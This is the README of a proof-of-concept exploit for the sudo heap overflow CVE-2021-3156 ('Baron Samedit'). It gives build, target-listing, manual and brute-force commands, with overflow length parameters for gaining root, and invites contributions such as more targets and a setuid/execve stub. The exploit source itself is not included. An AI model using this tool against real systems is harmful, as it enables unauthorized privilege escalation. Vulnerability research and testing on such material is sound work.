# CVE-2021-3156 PoC

## Introduction

This is an exploit for the `CVE-2021-3156` sudo vulnerability (dubbed [Baron Samedit](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt) by Qualys).

## Usage

build:
```
$ make
```


list targets:
```
$ ./sudo-hax-me-a-sandwich
```

run:
```
$ ./sudo-hax-me-a-sandwich <target_number>
```

manual mode:
```
$ ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

## Bruteforce target finding (experimental)

Make sure you have [GNU parallel](https://ftpmirror.gnu.org/parallel/parallel-latest.tar.bz2) installed.

```
$ make brute
$ ./brute.sh <smash_start> <smash_end> <null_start> <null_end> <lc_start> <lc_end>
```

some defaults to try:
```
$ ./brute.sh 90 120 50 70 150 300
```

Will eat up all available cores. Don't try to netflix & brute.

## Contributing

Send (sensible) PR's, I might merge.

Some ideas:
* More targets
* Target finding
* Other exploitation strategies
* More self contained functionality:
    * Embed shared library hax.c (Make it small please, ELF golf + asm setuid/execve stub)
    * Add mkdir logic to hax.c
* Directory/shared library cleanup
